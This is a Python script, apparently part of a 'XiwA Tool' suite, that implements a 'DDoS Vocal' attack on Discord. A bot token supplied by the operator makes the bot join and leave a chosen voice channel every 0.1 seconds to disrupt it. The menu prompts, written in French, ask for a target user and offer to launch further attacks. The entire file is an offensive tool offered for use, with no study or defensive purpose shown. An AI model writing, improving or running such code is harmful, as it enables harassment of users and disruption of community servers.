"""
Copyright (c) 2025 Dryz3R - XiwA Tool
All rights reserved.

ENGLISH:
This software is the property of Dryz3R and is protected by copyright laws.
Unauthorized copying, distribution, or modification of this software is strictly prohibited.
XiwA Tool is a comprehensive security and analysis suite developed by Dryz3R.

FRANÇAIS:
Ce logiciel est la propriété de Dryz3R et est protégé par les lois sur le droit d'auteur.
La copie, la distribution ou la modification non autorisée de ce logiciel est strictement interdite.
XiwA Tool est une suite complète de sécurité et d'analyse développée par Dryz3R.

ESPAÑOL:
Este software es propiedad de Dryz3R y está protegido por las leyes de derechos de autor.
Se prohíbe estrictamente la copia, distribución o modificación no autorizada de este software.
XiwA Tool es una suite completa de seguridad y análisis desarrollada por Dryz3R.
"""

import discord
import asyncio
import threading
import os
from colorama import Fore, Style, init

init()

RED = Fore.RED
WHITE = Fore.WHITE
RESET = Style.RESET_ALL

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear()
    print(f"""{RED}
    ██╗   ██╗ ██████╗  ██████╗ █████╗ ██╗         ██████╗ ██████╗  ██████╗ ███████╗
    ██║   ██║██╔═══██╗██╔════╝██╔══██╗██║         ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
    ██║   ██║██║   ██║██║     ███████║██║         ██║  ██║██║  ██║██║   ██║███████╗
    ╚██╗ ██╔╝██║   ██║██║     ██╔══██║██║         ██║  ██║██║  ██║██║   ██║╚════██║
     ╚████╔╝ ╚██████╔╝╚██████╗██║  ██║███████╗    ██████╔╝██████╔╝╚██████╔╝███████║
      ╚═══╝   ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
                                                        {WHITE}DDoS Vocal{RESET}
    """)

class VocalDDoS:
    def __init__(self):
        self.client = discord.Client(intents=discord.Intents.default())
        self.target_id = None
        self.voice_channel_id = None
        self.running = False
        
    async def connect_and_disconnect(self):
        while self.running:
            try:
                channel = self.client.get_channel(self.voice_channel_id)
                if channel:
                    vc = await channel.connect()
                    await asyncio.sleep(0.1)
                    await vc.disconnect()
            except:
                pass
            await asyncio.sleep(0.1)

    async def start_attack(self):
        print(f"\n{RED}[{WHITE}*{RED}]{WHITE} Démarrage de l'attaque DDoS vocale...")
        self.running = True
        
        @self.client.event
        async def on_ready():
            print(f"{RED}[{WHITE}+{RED}]{WHITE} Bot connecté en tant que {self.client.user}")
            await self.connect_and_disconnect()

    def run(self, token):
        try:
            self.client.run(token)
        except Exception as e:
            print(f"\n{RED}[{WHITE}!{RED}]{WHITE} Erreur: {e}")

def main():
    ddos = VocalDDoS()
    
    while True:
        print_banner()
        
        token = input(f"\n{RED}[{WHITE}>{RED}]{WHITE} Entrez le token du bot: ")
        target_id = input(f"{RED}[{WHITE}>{RED}]{WHITE} Entrez l'ID de l'utilisateur cible: ")
        channel_id = input(f"{RED}[{WHITE}>{RED}]{WHITE} Entrez l'ID du salon vocal: ")
        
        try:
            ddos.target_id = int(target_id)
            ddos.voice_channel_id = int(channel_id)
        except ValueError:
            print(f"\n{RED}[{WHITE}!{RED}]{WHITE} IDs invalides!")
            input(f"\n{RED}[{WHITE}>{RED}]{WHITE} Appuyez sur Entrée pour réessayer...")
            continue
            
        print(f"\n{RED}[{WHITE}*{RED}]{WHITE} Démarrage de l'attaque...")
        asyncio.run(ddos.start_attack())
        ddos.run(token)
        
        choice = input(f"\n{RED}[{WHITE}>{RED}]{WHITE} Voulez-vous lancer une autre attaque? (o/n): ").lower()
        if choice != 'o':
            break
        clear()

if __name__ == "__main__":
    main()
